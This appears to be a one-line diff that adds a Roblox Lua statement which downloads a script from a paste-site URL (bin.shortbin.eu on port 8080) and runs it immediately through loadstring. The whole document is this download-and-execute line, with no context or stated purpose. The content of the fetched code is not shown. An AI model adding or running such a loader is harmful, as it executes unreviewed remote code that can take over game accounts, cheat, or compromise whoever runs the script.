@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("http://bin.shortbin.eu:8080/raw/XBkUJpZcPi",true))()
